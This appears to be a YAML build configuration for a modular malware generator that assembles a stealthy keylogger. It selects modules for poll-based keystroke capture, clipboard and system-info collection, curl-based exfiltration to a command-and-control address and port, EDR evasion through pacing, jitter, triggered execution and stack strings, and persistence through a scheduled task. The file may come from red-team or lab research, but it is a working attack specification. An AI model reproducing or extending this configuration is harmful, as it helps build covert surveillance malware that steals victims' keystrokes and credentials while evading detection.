name: keylogger_stealth
description: EDR-evasive keylogger — poll-based, LOLBin exfil, pacing, persistence

core:
  - core/emit_buffer
  - core/run_cmd

collectors:
  - collectors/system_info_stealth
  - collectors/clipboard

keylogger: collectors/keylogger_poll

exfil: exfil/curl_lolbin
arch: arch/keylogger

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter
  - evasion/triggered_exec
  - evasion/stack_strings

persist: persist/scheduled_task

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
